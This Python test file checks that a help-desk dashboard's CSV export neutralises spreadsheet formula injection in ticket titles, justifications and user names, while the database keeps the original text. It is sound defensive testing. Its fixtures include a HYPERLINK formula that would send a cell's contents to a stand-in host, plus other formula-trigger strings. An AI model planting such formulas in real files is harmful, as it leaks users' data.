"""
A exportação CSV contra PostgreSQL de verdade (SEC-12).

O que só o caminho inteiro prova: que o texto que o cliente, o técnico e o
responsável escreveram sai NEUTRALIZADO do `GET /dashboard/reports/export/csv`,
que o banco continua guardando o texto original, e que o arquivo segue sendo o
que o download do front (F1-C-01a) aceita.

O banco é o mesmo Postgres descartável do `test_dashboard_postgres.py`, com a
transação revertida no fim de cada caso.
"""

import csv
import io
import uuid
from datetime import UTC, datetime

import pytest
from sqlalchemy import select

from app.models.models import Ticket, TicketCategory, TicketPriority, TicketStatus, User, UserRole
from app.utils.csv_seguro import valor_original
from tests import test_dashboard_postgres as _base
from tests.test_dashboard_periodos_postgres import _cliente_http, _limpa_overrides  # noqa: F401
from tests.test_dashboard_postgres import _usuario

url_do_banco = _base.url_do_banco
db = _base.db

DATAS = {"start_date": "2026-10-01", "end_date": "2026-10-10"}
CRIADO = datetime(2026, 10, 2, 13, tzinfo=UTC)
RESOLVIDO = datetime(2026, 10, 3, 13, tzinfo=UTC)

TITULO = '=HYPERLINK("http://exemplo.test/?x="&A1,"Abrir")'
JUSTIFICATIVA = '+1+1\r\n=2+2,"@x";-3'
NOME_DO_RESPONSAVEL = "@Ana Fórmula"

_GATILHOS = ("=", "+", "-", "@")

CABECALHO_DAS_JUSTIFICATIVAS = [
    "Protocolo",
    "Título",
    "Prioridade",
    "Resolvido em",
    "Responsável",
    "Motivo",
]


def _chamado(criador: User, responsavel: User, titulo: str, justificativa: str) -> Ticket:
    return Ticket(
        id=uuid.uuid4(),
        protocol=f"HS-CSV-{uuid.uuid4().hex[:8]}",
        title=titulo,
        description="corpo",
        priority=TicketPriority.high,
        category=TicketCategory.hardware,
        status=TicketStatus.resolved,
        creator_id=criador.id,
        assignee_id=responsavel.id,
        sla_response_breach=False,
        sla_resolve_breach=True,
        sla_total_paused_ms=0,
        sla_breach_justification=justificativa,
        auto_closed=False,
        reopen_count=0,
        created_at=CRIADO,
        updated_at=RESOLVIDO,
        resolved_at=RESOLVIDO,
        closed_at=None,
    )


async def _cenario(db):
    admin = _usuario(UserRole.admin, "Admin")
    cliente = _usuario(UserRole.client, "Cliente")
    tecnico = _usuario(UserRole.technician, NOME_DO_RESPONSAVEL)
    db.add_all([admin, cliente, tecnico])
    await db.flush()
    chamado = _chamado(cliente, tecnico, TITULO, JUSTIFICATIVA)
    legitimo = _chamado(cliente, tecnico, "Impressora não imprime — 日本語", "Peça em falta")
    db.add_all([chamado, legitimo])
    await db.flush()
    return admin, chamado, legitimo


async def _exporta(db, admin):
    async with _cliente_http(db, admin) as c:
        return await c.get("/api/v1/dashboard/reports/export/csv", params=DATAS)


def _secao_das_justificativas(linhas: list[list[str]]) -> list[list[str]]:
    inicio = linhas.index(CABECALHO_DAS_JUSTIFICATIVAS) + 1
    secao = []
    for linha in linhas[inicio:]:
        if not linha:
            break
        secao.append(linha)
    return secao


@pytest.mark.asyncio
async def test_texto_de_usuario_sai_neutralizado_e_reversivel(db):
    admin, chamado, _ = await _cenario(db)

    resposta = await _exporta(db, admin)

    assert resposta.status_code == 200
    linhas = list(csv.reader(io.StringIO(resposta.text)))
    secao = _secao_das_justificativas(linhas)
    (linha,) = [x for x in secao if x[0] == chamado.protocol]

    _, titulo, prioridade, _, responsavel, motivo = linha
    assert titulo == "'" + TITULO
    assert responsavel == "'" + NOME_DO_RESPONSAVEL
    # As duas linhas da justificativa, cada uma com o seu apóstrofo.
    assert motivo == "'+1+1\r\n'=2+2,\"@x\";-3"
    assert prioridade == "high"
    # Nada se perde: a volta devolve exatamente o que está no banco.
    assert valor_original(titulo) == TITULO
    assert valor_original(responsavel) == NOME_DO_RESPONSAVEL
    assert valor_original(motivo) == JUSTIFICATIVA


@pytest.mark.asyncio
async def test_nenhuma_celula_do_arquivo_comeca_por_formula(db):
    admin, _, _ = await _cenario(db)

    resposta = await _exporta(db, admin)

    for linha in csv.reader(io.StringIO(resposta.text)):
        for celula in linha:
            inicio = celula.lstrip(" \t\r\n ​﻿")
            assert not inicio.startswith(_GATILHOS) or celula.startswith("'"), celula

    # E o que vê o leitor que ignora as aspas (o Excel pt-BR no clique duplo):
    # cada linha física como começo de célula.
    texto = resposta.text.replace("\r\n", "\n").replace("\r", "\n")
    for fisica in texto.split("\n"):
        visivel = fisica.lstrip(" \t ​﻿").lstrip('"')
        assert not visivel.startswith(_GATILHOS), repr(fisica)


@pytest.mark.asyncio
async def test_estrutura_e_colunas_preservadas(db):
    """A quebra de linha e as vírgulas da justificativa não abrem registro novo."""
    admin, chamado, legitimo = await _cenario(db)

    resposta = await _exporta(db, admin)

    linhas = list(csv.reader(io.StringIO(resposta.text)))
    secao = _secao_das_justificativas(linhas)
    assert {x[0] for x in secao} == {chamado.protocol, legitimo.protocol}
    assert all(len(x) == len(CABECALHO_DAS_JUSTIFICATIVAS) for x in secao)
    # As outras seções seguem com as colunas de sempre.
    assert ["Categoria", "Quantidade"] in linhas
    assert ["hardware", "2"] in linhas
    assert ["Prioridade", "Total", "Violações", "Conformidade (%)"] in linhas


@pytest.mark.asyncio
async def test_texto_legitimo_e_unicode_saem_intactos(db):
    admin, _, legitimo = await _cenario(db)

    resposta = await _exporta(db, admin)

    secao = _secao_das_justificativas(list(csv.reader(io.StringIO(resposta.text))))
    (linha,) = [x for x in secao if x[0] == legitimo.protocol]
    assert linha[1] == "Impressora não imprime — 日本語"
    assert linha[5] == "Peça em falta"


@pytest.mark.asyncio
async def test_o_banco_continua_com_o_texto_original(db):
    admin, chamado, _ = await _cenario(db)
    # Os ids antes de expirar: depois, ler o atributo seria um carregamento
    # preguiçoso fora do contexto assíncrono.
    id_do_chamado, id_do_responsavel = chamado.id, chamado.assignee_id

    await _exporta(db, admin)

    # Lido de novo do banco, e não do objeto em memória.
    db.expire_all()
    titulo, justificativa = (
        await db.execute(
            select(Ticket.title, Ticket.sla_breach_justification).where(Ticket.id == id_do_chamado)
        )
    ).one()
    nome = (await db.execute(select(User.name).where(User.id == id_do_responsavel))).scalar_one()
    assert titulo == TITULO
    assert justificativa == JUSTIFICATIVA
    assert nome == NOME_DO_RESPONSAVEL


@pytest.mark.asyncio
async def test_o_arquivo_continua_o_que_o_download_do_front_aceita(db):
    """
    O `baixarRelatorio` da F1-C-01a confere o `Content-Type` e recusa corpo
    vazio ou que comece por `<`. A neutralização não pode mudar nada disso.
    """
    admin, _, _ = await _cenario(db)

    resposta = await _exporta(db, admin)

    assert resposta.headers["content-type"].startswith("text/csv")
    assert "attachment" in resposta.headers["content-disposition"]
    assert resposta.text
    assert not resposta.text.lstrip().startswith("<")
    assert resposta.text.startswith("Relatório HelpHS")
